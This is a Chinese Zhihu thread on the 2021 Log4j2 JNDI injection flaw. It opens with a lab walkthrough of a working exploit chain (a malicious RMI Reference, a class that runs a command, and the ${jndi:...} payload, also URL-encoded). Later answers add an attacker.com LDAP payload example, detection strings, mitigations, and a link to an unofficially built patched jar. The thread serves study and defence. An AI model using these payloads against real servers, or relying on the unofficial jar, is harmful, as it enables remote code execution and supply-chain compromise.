+<p>修改 RmiServer 的代码实现：</p>
+<pre tabindex=0><code>public class RmiServer {
+
+ public static void main(String\[\] args) throws Exception {
+  System.setProperty(&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;,&quot;true&quot;);
+  Registry registry = LocateRegistry.createRegistry(1099);
+  System.out.println(&quot;RMI启动，监听：1099 端口&quot;);
+  Reference reference = new Reference(&quot;Calc&quot;, &quot;Calc&quot;, &quot;http://127.0.0.1:8000/&quot;);
+  ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
+  registry.bind(&quot;hello&quot;, referenceWrapper);
+
+  Thread.currentThread().join();
+ }
+}
+
+
+</code></pre><p>由于采用的 Java 版本较高，需先将系统变量 com.sun.jndi.rmi.object.trustURLCodebase 设置为 true。</p>
+<p>其中绑定的 Reference 涉及三个变量：</p>
+<ul>
+<li>className：远程加载时所使用的类名，如果本地找不到这个类名，就去远程加载；</li>
+<li>classFactory：远程的工厂类；</li>
+<li>classFactoryLocation：工厂类加载的地址，可以是 file://、ftp://、http:// 等协议；</li>
+</ul>
+<p>此时，通过 Python 启动一个简单的 HTTP 监听服务：</p>
+<pre tabindex=0><code>192:~ zzs$ python -m SimpleHTTPServer
+Serving HTTP on 0.0.0.0 port 8000 ...
+
+
+</code></pre><p>打印日志，说明在 8000 端口进行了 http 的监听。</p>
+<p>对应的<a href="https://www.zhihu.com/search?q=%E5%AE%A2%E6%88%B7%E7%AB%AF&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A2269395593%7D">客户端</a>代码修改为如下：</p>
+<pre tabindex=0><code>public class RmiClient {
+
+ public static void main(String\[\] args) throws Exception {
+  System.setProperty(&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;,&quot;true&quot;);
+  Hashtable env = new Hashtable();
+  env.put(Context.INITIAL\_CONTEXT\_FACTORY, &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);
+  env.put(Context.PROVIDER\_URL, &quot;rmi://localhost:1099&quot;);
+  Context ctx = new InitialContext(env);
+  ctx.lookup(&quot;hello&quot;);
+ }
+}
+
+
+</code></pre><p>执行，客户端代码，发现 Python 监听的服务打印如下：</p>
+<pre tabindex=0><code>127.0.0.1 - - \[12/Dec/2021 16:19:40\] code 404, message File not found
+127.0.0.1 - - \[12/Dec/2021 16:19:40\] &quot;GET /Calc.class HTTP/1.1&quot; 404 -
+
+
+</code></pre><p>可见，客户端已经去远程加载恶意 class（Calc.class）文件了，只不过 Python 服务并没有返回对应的结果而已。</p>
+<h3 id=进一步改造><strong>进一步改造</strong></h3>
+<p>上述代码证明了可以通过 RMI 的形式进行攻击，下面基于上述代码和 Spring Boot Web 服务的形式进一步演示。通过 JNDI 注入 + RMI 的形式调用起本地的计算器。</p>
+<p>上述的基础代码不变，后续只微调 RmiServer 和 RmiClient 类，同时添加一些新的类和方法。</p>
+<p><strong>第一步：构建攻击类</strong></p>
+<p>创建一个攻击类 BugFinder，用于启动本地的计算器：</p>
+<pre tabindex=0><code>public class BugFinder {
+
+ public BugFinder() {
+  try {
+   System.out.println(&quot;执行漏洞代码&quot;);
+   String\[\] commands = {&quot;open&quot;, &quot;/System/Applications/Calculator.app&quot;};
+   Process pc = Runtime.getRuntime().exec(commands);
+   pc.waitFor();
+   System.out.println(&quot;完成执行漏洞代码&quot;);
+  } catch (Exception e) {
+   e.printStackTrace();
+  }
+ }
+
+ public static void main(String\[\] args) {
+  BugFinder bugFinder = new BugFinder();
+ }
+
+}
+
+
+</code></pre><p>本人是 Mac 操作系统，代码中就基于 Mac 的命令实现方式，通过 Java 命令调用 Calculator.app。同时，当该类被初始化时，会执行启动计算器的命令。</p>
+<p>将上述代码进行编译，存放在一个位置，这里单独 copy 出来放在了”/Users/zzs/temp/BugFinder.class“路径，以备后用，这就是攻击的恶意代码了。</p>
+<p><strong>第二步：构建 Web 服务器</strong></p>
+<p>Web 服务用于 RMI 调用时返回攻击类文件。这里采用 Spring Boot 项目，核心实现代码如下：</p>
+<pre tabindex=0><code>@RestController
+public class ClassController {
+
+ @GetMapping(value = &quot;/BugFinder.class&quot;)
+ public void getClass(HttpServletResponse response) {
+  String file = &quot;/Users/zzs/temp/BugFinder.class&quot;;
+  FileInputStream inputStream = null;
+  OutputStream os = null;
+  try {
+   inputStream = new FileInputStream(file);
+   byte\[\] data = new byte\[inputStream.available()\];
+   inputStream.read(data);
+   os = response.getOutputStream();
+   os.write(data);
+   os.flush();
+  } catch (Exception e) {
+   e.printStackTrace();
+  } finally {
+   // 省略流的判断关闭；
+  }
+ }
+}
+
+
+</code></pre><p>在该 Web 服务中，会读取 BugFinder.class 文件，并返回给 RMI 服务。重点提供了一个 Web 服务，能够返回一个可执行的 class 文件。</p>
+<p><strong>第三步：修改 RmiServer</strong></p>
+<p>对 RmiServer 的绑定做一个修改：</p>
+<pre tabindex=0><code>public class RmiServer {
+
+ public static void main(String\[\] args) throws Exception {
+  System.setProperty(&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;,&quot;true&quot;);
+  Registry registry = LocateRegistry.createRegistry(1099);
+  System.out.println(&quot;RMI启动，监听：1099 端口&quot;);
+  Reference reference = new Reference(&quot;com.secbro.rmi.BugFinder&quot;, &quot;com.secbro.rmi.BugFinder&quot;, &quot;http://127.0.0.1:8080/BugFinder.class&quot;);
+  ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
+  registry.bind(&quot;hello&quot;, referenceWrapper);
+
+  Thread.currentThread().join();
+ }
+}
+
+
+
+</code></pre><p>这里 Reference 传入的参数就是攻击类及远程下载的 Web 地址。</p>
+<p><strong>第四步：执行客户端代码</strong></p>
+<p>执行客户端代码进行访问：</p>
+<pre tabindex=0><code>public class RmiClient {
+
+ public static void main(String\[\] args) throws Exception {
+  System.setProperty(&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;,&quot;true&quot;);
+  Hashtable env = new Hashtable();
+  env.put(Context.INITIAL\_CONTEXT\_FACTORY, &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);
+  env.put(Context.PROVIDER\_URL, &quot;rmi://localhost:1099&quot;);
+  Context ctx = new InitialContext(env);
+  ctx.lookup(&quot;hello&quot;);
+ }
+}
+
+
+</code></pre><p>本地计算器被打开：</p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic3.zhimg.com/v2-4159a09111322b7e9d561860cc2905c2_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<h2 id=基于-log4j2-的攻击><strong>基于 Log4j2 的攻击</strong></h2>
+<p>上面演示了基本的攻击模式，基于上述模式，我们再来看看 Log4j2 的漏洞攻击。</p>
+<p>在 Spring Boot 项目中引入了 log4j2 的受影响版本：</p>
+<pre tabindex=0><code>&lt;dependency&gt;
+ &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
+ &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;
+ &lt;exclusions&gt;&lt;!-- 去掉springboot默认配置 --&gt;
+  &lt;exclusion&gt;
+   &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
+   &lt;artifactId&gt;spring-boot-starter-logging&lt;/artifactId&gt;
+   &lt;/exclusion&gt;
+  &lt;/exclusions&gt;
+&lt;/dependency&gt;
+
+&lt;dependency&gt; &lt;!-- 引入log4j2依赖 --&gt;
+   &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
+   &lt;artifactId&gt;spring-boot-starter-log4j2&lt;/artifactId&gt;
+&lt;/dependency&gt;
+
+
+</code></pre><p>这里需要注意，先排除掉 Spring Boot 默认的日志，否则可能无法复现 Bug。</p>
+<p>修改一下 RMI 的 Server 代码：</p>
+<pre tabindex=0><code>public class RmiServer {
+
+ public static void main(String\[\] args) throws Exception {
+  System.setProperty(&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;,&quot;true&quot;);
+  Registry registry = LocateRegistry.createRegistry(1099);
+  System.out.println(&quot;RMI启动，监听：1099 端口&quot;);
+  Reference reference = new Reference(&quot;com.secbro.rmi.BugFinder&quot;, &quot;com.secbro.rmi.BugFinder&quot;, null);
+  ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
+  registry.bind(&quot;hello&quot;, referenceWrapper);
+  Thread.currentThread().join();
+ }
+}
+
+
+</code></pre><p>这里直接访问 BugFinder，JNDI 绑定名称为：hello。</p>
+<p>客户端引入 Log4j2 的 API，然后记录日志：</p>
+<pre tabindex=0><code>import org.apache.logging.log4j.LogManager;
+import org.apache.logging.log4j.Logger;
+
+public class RmiClient {
+
+ private static final Logger logger = LogManager.getLogger(RmiClient.class);
+
+ public static void main(String\[\] args) throws Exception {
+  System.setProperty(&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;,&quot;true&quot;);
+  logger.error(&quot;${jndi:rmi://127.0.0.1:1099/hello}&quot;);
+  Thread.sleep(5000);
+ }
+}
+
+
+
+</code></pre><p>日志中记录的信息为 “${jndi:rmi://127.0.0.1:1099/hello}”，也就是 RMI Server 的地址和绑定的名称。</p>
+<p>执行程序，发现<a href="https://www.zhihu.com/search?q=%E8%AE%A1%E7%AE%97%E5%99%A8&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A2269395593%7D">计算器</a>被成功打开。</p>
+<p>当然，在实际应用中，<a href="https://www.zhihu.com/search?q=logger.error&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A2269395593%7D">logger.error</a> 中记录的日志信息，可能是通过参数获得，比如在 Spring Boot 中定义如下代码：</p>
+<pre tabindex=0><code>@RestController
+public class Log4jController {
+
+ private static final Logger logger = LogManager.getLogger(Log4jController.class);
+
+ /\*\*
+  \* 方便测试，用了get请求
+  \* @param username 登录名称
+  \*/
+ @GetMapping(&quot;/a&quot;)
+ public void log4j(String username){
+  System.out.println(username);
+  // 打印登录名称
+  logger.info(username);
+ }
+}
+
+
+</code></pre><p>在浏览器中请求 URL 为：</p>
+<pre tabindex=0><code>http://localhost:8080/a?username=%24%7Bjndi%3Armi%3A%2F%2F127.0.0.1%3A1099%2Fhello%7D
+
+
+</code></pre><p>其中 username 参数的值就是 “${jndi:rmi://127.0.0.1:1099/hello}” 经过 URLEncoder#encode 编码之后的值。此时，访问该 URL 地址，同样可以将打开计算器。</p>
+<p>至于 Log4j2 内部逻辑漏洞触发 JNDI 调用的部分就不再展开了，感兴趣的朋友在上述实例上进行 debug 即可看到完整的调用链路。</p>
+<h2 id=----><strong>-&mdash;</strong></h2>
+<p>本文涉及到的代码都是本人</p>
+<p><a href>@沉默王二</a></p>
+<p>亲自实验过的，强烈建议大家也跑一遍代码，真切感受一下如何实现攻击逻辑。</p>
+<p>JNDI 注入事件不仅在 Log4j2 中发生过，而且在大量其他框架中也有出现。虽然 JDNI 为我们带来了便利，但同时也带了风险。不过在实例中大家也看到在 JDK 的高版本中，不进行特殊设置（com.sun.jndi.rmi.object.trustURLCodebase 设置为 true），还是无法触发漏洞的。这样也多少让人放心一些。</p>
+<p>注：切勿随意攻击，学习就好~~~~~~</p>
+<h3 id=知乎用户--匿名用户-发表>知乎用户 匿名用户 发表</h3>
+<p>谢谢 刚应急完</p>
+<h3 id=知乎用户--qwe-发表>知乎用户 qwe 发表</h3>
+<p>Apache Log4j 爆今年最大漏洞，这个漏洞的严重性堪称今年之最，灾难等级为核弹级。</p>
+<p>Log4j-2 中存在 JNDI 注入漏洞，攻击者仅需向目标输入一段代码，不需要用户执行任何多余操作即可触发该漏洞，使攻击者可以远程控制用户服务器，执行任意代码。</p>
+<h3 id=知乎用户-编程技术指南-发表>知乎用户 编程技术指南 发表</h3>
+<p>昨晚，Apache Log4j2 的<a href="https://www.zhihu.com/search?q=%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A2265418421%7D">远程代码执行漏洞</a>刷爆朋友圈，该漏洞一旦被攻击者利用会造成严重危害。而且此次漏洞影响巨大，很多网站如百度等都是此次 Log4j 远程代码执行漏洞的受害者，很多互联网企业也都连夜做了应急措施。</p>
+<p>这个 BUG 太严重了，十多个小时前，互联网上曝出了 Apache Log4j2 中的远程代码执行漏洞，攻击者可利用此漏洞构造特殊的数据请求包，最终触发远程代码执行。</p>
+<p>要知道，绝大部分的 Java 应用用的都是 Log4j 的包记录日志，而很多互联网公司用的是 Log4j2，据 “白帽” 分析确认，几乎所有技术巨头如百度等都是该 Log4j 远程代码执行漏洞的受害者。</p>
+<p>漏洞原理官方表述是：Apache Log4j2 中存在 JNDI 注入漏洞，当程序将用户输入的数据进行日志记录时，即可触发此漏洞，成功利用此漏洞可以在目标服务器上执行任意代码。</p>
+<p>通俗简单的说就是：在打印日志的时候，如果你的日志内容中包含关键词 <strong>${</strong>，攻击者就能将关键字所包含的内容当作变量来替换成任何攻击命令，并且执行。</p>
+<p>由于 Apache Log4j2 的某些函数具有递归分析函数，因此攻击者可以直接构造恶意请求来触发远程代码执行漏洞。</p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic2.zhimg.com/v2-65a4868240d0a828ac88390ead7223e0_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<p><strong>Apache Log4j2</strong></p>
+<p>Apache Log4j2 是一款开源的 Java 日志记录工具，大量的业务框架都使用了该组件。此次漏洞是用于 Log4j2 提供的 lookup 功能造成的，该功能允许开发者通过一些协议去读取相应环境中的配置。但在实现的过程中，并未对输入进行严格的判断，从而造成漏洞的发生。</p>
+<p><strong>漏洞检测方案</strong></p>
+<p>1、通过流量监测设备监控是否有相关 DNSLog 域名的请求</p>
+<p>2、通过监测相关日志中是否存在 “jndi:ldap://”、“jndi:rmi” 等字符来发现可能的攻击行为。</p>
+<p><strong>漏洞详情：</strong></p>
+<p>Apache Log4j 远程代码执行漏洞 严重程度: 严重由于 Apache Log4j2 某些功能存在递归解析功能，攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置**漏洞情况分析：**Apache Log4j 是一个基于 Java 的日志记录组件。Apache Log4j2 是 Log4j 的升级版本，通过重写 Log4j 引入了丰富的功能特性。该日志组件被广泛应用于业务系统开发，用以记录程序输入输出日志信息。2021 年 11 月 24 日，阿里云安全团队向 Apache 官方报告了 Apache Log4j2 远程代码执行漏洞。由于 Log4j2 组件在处理程序日志记录时存在 JNDI 注入缺陷，未经授权的攻击者利用该漏洞，可向目标服务器发送精心构造的恶意数据，触发 Log4j2 组件解析缺陷，实现目标服务器的任意代码执行，获得目标服务器权限。</p>
+<p><strong>漏洞编号：<strong>暂缺</strong>漏洞</strong></p>
+<p>**等级：**高危，该漏洞影响范围极广，危害极大。</p>
+<p>**CVSS 评分：**10（最高级）<strong>漏洞状态：</strong></p>
+<p>![](data:image/svg+xml;utf8,)</p>
+<p>**受影响的版本：**Apache log4j2 2.0 - 2.14.1 版本均受影响。</p>
+<p>**安全版本：**Apache log4j-2.15.0-rc2</p>
+<h3 id=易受攻击代码示例><strong>易受攻击代码示例：</strong></h3>
+<pre tabindex=0><code>import org.apache.log4j.Logger;
+import java.io.\*;
+import java.sql.SQLException;
+import java.util.\*;
+public class VulnerableLog4jExampleHandler implements HttpHandler {
+  static Logger log = Logger.getLogger(log4jExample.class.getName());
+  /\*\*
+   \* A simple HTTP endpoint that reads the request's User Agent and logs it back.
+   \* This is basically pseudo-code to explain the vulnerability, and not a full example.
+   \* @param he HTTP Request Object
+   \*/
+  public void handle(HttpExchange he) throws IOException {
+    string userAgent = he.getRequestHeader(&quot;user-agent&quot;);
+    
+    // This line triggers the RCE by logging the attacker-controlled HTTP User Agent header.
+    // The attacker can set their User-Agent header to: ${jndi:ldap://attacker.com/a}
+    log.info(&quot;Request User Agent:&quot; + userAgent);
+    String response = &quot;&lt;h1&gt;Hello There, &quot; + userAgent + &quot;!&lt;/h1&gt;&quot;;
+    he.sendResponseHeaders(200, response.length());
+    OutputStream os = he.getResponseBody();
+    os.write(response.getBytes());
+    os.close();
+  }
+}
+
+</code></pre><p><strong>漏洞修复方案：</strong></p>
+<p>Apache 官方已发布补丁，建议受影响的用户尽快升级到安全版本。</p>
+<p><strong>补丁下载地址：</strong><a href="https://link.zhihu.com/?target=https%3A//github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2">https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2</a></p>
+<p><strong>漏洞缓解措施：</strong></p>
+<p>（1）jvm 参数 -Dlog4j2.formatMsgNoLookups=true</p>
+<p>（2）log4j2.formatMsgNoLookups=True</p>
+<p>（3） 将系统环境变量 FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS 设置为 true</p>
+<p>因该组件使用极为广泛，利用门槛很低，危害极大，建议所有用户尽快升级到安全版本。</p>
+<p>请联系厂商获取修复后的官方版本：</p>
+<p><a href="https://link.zhihu.com/?target=https%3A//github.com/apache/logging-log4j2">https://github.com/apache/logging-log4j2</a></p>
+<p>目前最新版本 2.15.0</p>
+<p><strong>现在网上公开的仓库还下载不到解决漏洞的 Log4j2 2.15.0 版本，需要自己编译源码获取 Jar 包，我这里有一份，漏洞高危，建议紧急替换：</strong><br>
+Log4j2 2.15.0 jar 包下载：</p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic1.zhimg.com/v2-ee0a13531ce7e10b7e9175aaa5dc3bfe_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<p><a href="https://link.zhihu.com/?target=https%3A//note.youdao.com/s/IAgMqFGc">下载包</a></p>
+<h2 id=在官方没有更新前可以做的事情>在官方没有更新前，可以做的事情：</h2>
+<p>1、排查应用是否引入了 Apache <a href="https://www.zhihu.com/search?q=log4j-core&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A2265418421%7D">log4j-core</a> Jar 包，若存在依赖引入，且在受影响版本范围内，则可能存在漏洞影响。请尽快升级 Apache Log4j2 所有相关应用到最新的 log4j-2.15.0-rc2 版本，地址 <a href="https://link.zhihu.com/?target=https%3A//github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2">https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2</a></p>
+<p>2、升级已知受影响的应用及组件，如 spring-boot-starter-log4j2/Apache Struts2/Apache Solr/Apache Druid/Apache Flink</p>
+<p>3、可升级 jdk 版本至 6u211 / 7u201 / 8u191 / 11.0.1 以上，可以在一定程度上限制 JNDI 等漏洞利用方式。</p>
+<p>相关链接</p>
+<p>1、<a href="https://link.zhihu.com/?target=https%3A//github.com/apache/logging-log4j2">https://github.com/apache/logging-log4j2</a></p>
+<p>2、<a href="https://link.zhihu.com/?target=https%3A//github.com/advisories/GHSA-jfh8-c2jp-5v3q">https://github.com/advisories/GHSA-jfh8-c2jp-5v3q</a></p>
+<p>如果你用的阿里云环境，可以参考：<br>
+1）云盾 WAF 已可防护该类漏洞，并提供 7 天免费漏洞应急服务，为您争取漏洞修复时间，应急开通地址：<a href="https://link.zhihu.com/?target=https%3A//c.tb.cn/I3.XzCtR">https://c.tb.cn/I3.XzCtR</a></p>
+<p>2）阿里云云安全中心应用漏洞模块已支持对该漏洞一键检测</p>
+<p>3）阿里云云防火墙已可防御此漏洞攻击</p>
+<h3 id=知乎用户-苏安-发表>知乎用户 苏安​ 发表</h3>
+<p>这件事情揭露了政府的政策法规没有人在遵守的事实。</p>
+<p>安全厂家挖洞后先自用再报给厂商，然后就是发 “漏洞预警” 安利推销自家产品。在约等于公开的情况下 （漏洞从通告到出 poc 大多数情况下只需要 diff 很短的时间）各大安全厂商跟进争着安利自家产品。</p>
+<p>“要么赶紧下补丁，要么就用我们家得策略”</p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic3.zhimg.com/v2-885aabbe42b54d007e3eb8ee5d065acc_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<p><a href="https://www.zhihu.com/search?q=%E8%84%9A%E6%9C%AC%E5%B0%8F%E5%AD%90&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A2264375876%7D">脚本小子</a>看到有人发 poc 就开始无视网络安全法，各种扫各种插。到现在我已经看到了百度搜索 苹果 icloud jd 搜索 360 搜索 这些大厂的攻击截图。</p>
+<p>log4j 作为 “基础库”（注意引号）漏洞影响范围太大了</p>
+<p>单拿百度来说，如此突如其来的漏洞，虽说官方发了 rc 但是谈何修起呢？一家大厂多少业务多少 java？应急怕是都来不及吧。别说整个互联网了。</p>
+<p>总的来说互联网是脆弱的，在现有的法律法规无法约束国内的安全厂商和安全人员的情况下不知道下次要出个无条件 rce 这个世界会是什么样子。</p>
+<p>堵不如疏，希望这一天早点到来吧。</p>
+<p>在这一天到来之前 log4j 必将接过 shiro/s2/fastjson 等历史漏洞的大旗继续养活着广大安全行业的从业者</p>
+<p>题外话：</p>
+<p>某云发布漏洞通告大概十分钟不到的时间 我就在我司的群里拿到了 poc 当我去打目标的时候 发现 waf 已经拦截了（测试过了 是针对现在流传的那个 poc 的规则）</p>
+<p>不得不说 应急的挺快</p>
+<h3 id=知乎用户-小菜鸡-发表>知乎用户 小菜鸡 发表</h3>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic3.zhimg.com/v2-8baedeaa7df2d767d36db6420f2855df_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<h3 id=知乎用户-啥也不会噢-发表>知乎用户 啥也不会噢 发表</h3>
+<p>他奶奶的。我一个人搞 20 几个项目升级，全公司都在加班搞。我到现在都还没有下班。几百个 jar 包冲突。搞死我了。</p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic4.zhimg.com/v2-f8c0f4da4e8eea225e53f25bbe98e8fd_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<h3 id=知乎用户-匿名用户-发表>知乎用户 匿名用户 发表</h3>
+<p>对于我这个吃瓜脚本小子，只能说简直就像狂欢一样。</p>
+<p>别问我怎么怎么复现，问就是看 patch 自己摸索（</p>
+<h3 id=知乎用户-whiletrue-发表>知乎用户 while(true) 发表</h3>
+<p>有没有大佬说下修复完了怎么验证啊？我百度了半天，本地输入 jndi 表达式也没啥问题呀。rc2 也打包完了，不知道行不行。</p>
+<h3 id=知乎用户-狐狸-发表>知乎用户 狐狸 发表</h3>
+<p>晚上好，夜之城！昨天的漏洞复现，最后结果是满打满算的整整三百个！多亏了没完没了的脚本小子，光安全公司就发了十篇公众号。但有一位阿里云直接公布漏洞了，我看你们全得赔钱，因为《网络产品安全漏洞管理规定》 肯定咽不下这口气。</p>
+<p>安全公司再次通宵加班。apache 遭人破坏，又是网络黑客干的好事。与此同时，甲方公司的安全小组还在公司资产里替漏洞的受害者擦屁股。而在漏洞平台呢… 好吧… 漏洞平台还是那个不收漏洞的漏洞平台。我是你们的脚本老狐狸。和我一起，开始加班的新一晚吧。</p>
+<hr>
+<p>不扯淡了，从昨天到今晚，几乎全国（可能全世界）的安全公司都在应急响应，安全运维在过清明节，脚本小子在过年，众测白帽正说过年了——忽然发现各大漏洞平台都不收 log4j 的漏洞了，属于是乐极生悲。</p>
+<p>这个漏洞的范围非常大，去找哪些网站用了它还不如去找谁没用它。而易用性更是简单到一个有框就能验证的地步了。但危害性，任意代码执行，lmao，这漏洞可比 shiro 离谱多了。</p>
+<p>剩下的待会写 加了一天班了先派派一会</p>
+<h3 id=知乎用户--360-小安-发表>知乎用户 360 小安​ 发表</h3>
+<p>12 月 11 日，360 安全大脑监测到有黑客疑似利用 Apache Log4j 2 漏洞（编号 CVE-2021-44228）对 Minecraft（游戏名称 “我的世界”）Java 版发起大规模攻击，最高峰时段每小时有超过 10000 个玩家遭到了攻击。</p>
+<p>据悉，该漏洞危害严重，利用方式简单，影响广泛，凡使用 Java 应用的用户电脑都有被波及的风险，其破坏力或将堪比 2017“永恒之蓝” 病毒。远程控制的黑客可以利用该漏洞引导受害者去做任何指令，包括安装插件、盗号、盗取资料等等高危行为，危害用户网络、财产安全，风险极大。对此，360 安全团队第一时间推出终端网络层拦截工具，率先对该漏洞进行拦截，升级最新版 <a href="https://www.zhihu.com/search?q=360%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A2269055671%7D">360 安全卫士</a>即可使用。</p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic3.zhimg.com/v2-f93d850eb4b314aaef74de86e02806c3_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<p><strong>互联网服务提供应商首当其冲</strong> <strong>个人用户也难以逃脱</strong></p>
+<p>Apache Log4j 是一个基于 Java 的日志记录工具，是 Apache 软件基金会下的一个开源项目。而此次出现漏洞的 Apache Log4j 2 则是目前该项目的最新版本，且被广泛地应用于各种常见的 Web 服务中。而所有使用 Java 作为开发语言产品研发的互联网服务提供商、甚至公司 OA 系统等提供外部服务的应用只要用 Apache Log4j 2 插件，都极有可能遭受攻击。</p>
+<p>攻击者仅需向目标输入一段代码，不需要用户执行任何多余操作即可触发该漏洞，使攻击者可以远程控制用户受害者服务器，凡是基于 java 开发的应用平台都可能会受到影响。目前，IT 通信（互联网）、高校、工业制造、金融、政府、医疗卫生、运营商等几乎所有行业都受到该漏洞波及，全球知名科技公司、电商网站等也未能幸免。</p>
+<p>而且个人用户也难以幸免。黑客利用最新曝光的 Log4j 2 漏洞对 Minecraft 玩家发起攻击，且攻击方法极为简单，聊天窗口发个网址即可触发该漏洞。攻击最早发生于 12 月 10 日，早期攻击规模较小，第一天检测到的受攻击玩家数量在 100 左右。12 月 11 日 12 时起，黑客发起大规模攻击，从 12 时开始到目前，平均每小时有近 5000 个 Mincraft 玩家遭到攻击，攻击最高峰时有超过 10000 个玩家遭到攻击。</p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic3.zhimg.com/v2-300b718132e3bb41c6be2dc89725b93e_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<p><strong>360 安全卫士率先推出终端网络层拦截工具</strong></p>
+<p>在监测到黑客利用 Apache Log4j2 漏洞对 Minecraft 玩家发起攻击后，360 安全团队第一时间响应，已针对该漏洞率先推出拦截方案，可以保护用户电脑不被触发该漏洞，并进行修复。广大用户可前往 360 卫士官网（<a href="https://link.zhihu.com/?target=https%3A//weishi.360.cn/">https://weishi.360.cn/</a>）下载最新版本 360 安全卫士，即可立即获取 Apache Log4j 2 拦截方案。</p>
+<p>360 网络安全专家预警，若该漏洞的传播攻击范围未得到及时控制，其破坏力或将堪比 2017“永恒之蓝” 病毒，受害者未必会有明显感知，但是远程控制的黑客可以利用该漏洞引导受害者去做任何指令，安装插件、盗号、盗取资料等等高危行为，危害用户网络、财产安全，风险极大。</p>
+<h3 id=知乎用户-wingo-发表>知乎用户 Wingo 发表</h3>
+<p>一觉起来发现和世界末日擦肩而过，还好安卓是自己写的日志系统，没有用 Java 的。不然这么简单的触发条件啊啊啊啊，理论上绝大部分人的手机都可以直接远程执行指定网站上的任意 Java 程序，&mldr;（讲个笑话：远程代码执行漏洞还是最高安级别 hhhh），Java 底层出问题&mldr;..emmmm 怎么说呢&mldr; 吃瓜吃瓜，我就安安静静的吃瓜 hhhhh</p>
+<h3 id=知乎用户--前端实验室-发表>知乎用户 前端实验室​ 发表</h3>
+<h3 id=可怜的百度>可怜的百度&mldr;</h3>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic1.zhimg.com/v2-5e8345dc7251b104d04bb32c7b1e423d_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<h3 id=apache-log4j2><strong>Apache Log4j2</strong></h3>
+<p>Apache Log4j2 最初是由 Ceki Gülcü 编写，是 Apache 软件基金会 Apache 日志服务项目的一部分。Log4j 是几种 Java 日志框架之一。而 Apache Log4j2 是对 Log4j 的升级，相比其前身 Log4j1 有了更显著的改进，同时修复了 Logback 架构中的一些固有问题。</p>
+<p>通过 Apache Log4j2 框架，开发者可通过定义每一条日志信息的级别，来控制日志生成过程。</p>
+<p>目前该日志框架已被广泛用于业务系统开发，用来记录日志信息。大多数情况下，开发者可能会将用户输入导致的错误信息写入日志中。</p>
+<h3 id=漏洞描述-1><strong>漏洞描述</strong></h3>
+<p>Apache Log4j2 <a href="https://www.zhihu.com/search?q=%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A2265579754%7D">远程代码执行漏洞</a>的详细信息已被披露，而经过分析，本次 Apache Log4j 远程代码执行漏洞，正是由于组件存在 Java JNDI 注入漏洞：当程序将用户输入的数据记入日志时，攻击者通过构造特殊请求，来触发 Apache Log4j2 中的远程代码执行漏洞，从而利用此漏洞在目标服务器上执行任意代码。</p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic1.zhimg.com/v2-def1a729e18752f8b770a7b07b6dcff3_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<p>受影响版本：</p>
+<p>Apache Log4j 2.x &lt;= 2.14.1</p>
+<p>已知受影响的应用程序和组件：</p>
+<ul>
+<li>srping-boot-strater-log4j2</li>
+<li>Apache Solr</li>
+<li>Apache Flink</li>
+<li>Apache Druid</li>
+</ul>
